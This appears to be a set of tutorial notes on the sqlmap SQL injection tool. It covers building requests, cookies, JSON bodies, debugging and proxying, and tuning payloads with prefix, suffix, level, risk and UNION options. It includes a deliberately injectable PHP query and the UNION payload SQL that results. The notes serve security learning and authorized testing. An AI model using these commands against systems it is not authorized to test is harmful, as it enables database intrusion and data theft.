## 1- Running SQLMap on an HTTP Request
Proper HTTP request setup is essential: missing cookies, malformed POST data, or over-complicated command lines can prevent detection/exploitation.
#### Curl Commands
Copy request as cURL from browser devtools and convert to sqlmap by replacing `curl` with `sqlmap` (keeps identical headers and params).

```bash
sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
```
When using cURL-derived commands, ensure at least one parameter is injectable or use automatic parameter discovery options (e.g., --crawl, --forms, -g).

#### GET/POST Requests
Provide GET via -u/--url. Provide POST via --data.

```bash
sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
```
To target a single POST parameter:
```bash
sqlmap 'http://www.example.com/' --data 'uid=1&name=test' -p uid
```
To mark a parameter inside data for automatic testing, use an asterisk:
```bash
sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
```

#### Full HTTP Requests
Use -r to supply a full HTTP request file (**captured from Burp or copied from browser or using the browser,open the network tab in devtools `Copy` > `Copy Request Headers`, and then pasting the request into a file** ). The request file contains method, path, headers and body.

```text
GET /?id=1 HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 ...
Accept: text/html
Connection: close
```
Run:
```bash
sqlmap -r req.txt
```

we can specify the parameter we want to inject in with an asterisk (`*`), such as '/?id=`*`'.

#### Custom SQLMap Requests
Common switches for fine-tuning headers, cookies and method:

```bash
# Set cookie:
sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'

# Set cookie via header:
sqlmap ... -H 'Cookie: PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'

# Other headers:
sqlmap ... -H 'Referer: https://ref' -H 'Host: target.com' -A 'Custom-Agent'

# Randomize User-Agent:
sqlmap ... --random-agent

# Test headers for injection (mark header value):
sqlmap ... --cookie='id=1*'      # tests header value for SQLi

# Change HTTP method:
sqlmap -u www.target.com --data='id=1' --method PUT
```

#### Custom HTTP Requests (JSON/XML)
SQLMap supports JSON and XML bodies. For short/simple bodies use --data. For complex/long bodies place full request in file and use -r.

Example JSON body:
```bash
cat req.txt
HTTP / HTTP/1.0
Host: www.example.com

{
  "data": [{
    "type": "articles",
    "id": "1",
    "attributes": {
      "title": "Example JSON",
      "body": "Just an example",
      "created": "2020-05-22T14:56:29.000Z",
      "updated": "2020-05-22T14:56:28.000Z"
    },
    "relationships": {
      "author": {
        "data": {"id": "42", "type": "user"}
      }
    }
  }]
}
```

Run with request file:
```bash
sqlmap -r req.txt
```


---

## 2- Handling SQLMap Errors
Enable options to reveal DBMS errors, save full traffic, raise verbosity, or proxy traffic for inspection.
#### Display Errors

Use `--parse-errors` to print parsed DBMS error messages during the run.

```bash
sqlmap -u "http://www.target.com/vuln.php?id=1" --parse-errors
```
#### Store the Traffic
Save full HTTP request/response traffic to a file for offline inspection.
```bash
sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt
cat /tmp/traffic.txt
```
#### Verbose Output
Increase verbosity to see debug logs and full traffic in real time.
```bash
sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch
```
#### Using a Proxy
Route SQLMap traffic through a proxy (Burp/ZAP) to capture, replay, and modify requests.
```bash
sqlmap -u "http://www.target.com/vuln.php?id=1" --proxy=http://127.0.0.1:8080
```


---

## 3- Attack Tuning

### Vector / Boundaries

- Payload = **vector** (e.g. `UNION ALL SELECT ...`).
- **Prefix/suffix** wrap the vector so it fits the target SQL (`--prefix` and `--suffix` in sqlmap).

```bash
# force prefix/suffix for all vectors
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```

```php
// vulnerable PHP (how payload is injected)
$query = "SELECT id,name,surname FROM users WHERE id LIKE (('" . $_GET["q"] . "')) LIMIT 0,1";
```

```sql
# resulting SQL when q=test and payload bound with %')) and -- -
SELECT id,name,surname FROM users WHERE id LIKE (('test%')) UNION ALL SELECT 1,2,VERSION()-- -')) LIMIT 0,1
```
#### Level / Risk
- `--level 1-5` → expands payloads/boundaries (1 = default, 5 = most).
- `--risk 1-3` → includes riskier payloads (e.g., `OR` that may change DB).
- Use `-v 3` to see exact `[PAYLOAD]`s sqlmap tries.

```bash
sqlmap -u "www.example.com/?id=1" -v 3 --level=5 --risk=3
```
#### Advanced tuning 
- `--code=<HTTP_CODE>` — treat this code as the “TRUE” response.
- `--titles` — compare `<title>` values to detect differences.
- `--string=<STR>` — base detection on presence of a string.
- `--text-only` — strip HTML, compare text only.
- `--technique=<letters>` — limit techniques (B=Boolean, E=Error, U=UNION, T=Time).
- `--flush-session` removes saved session data for the target so sqlmap will re-run discovery and data retrieval.
#### UNION tuning
- `--union-cols=<n>` — set column count for UNION.
- `--union-char='<val>'` — use alternate filler instead of `NULL`/ints.
- `--union-from=<table>` — append `FROM <table>` when needed (Oracle, etc.).
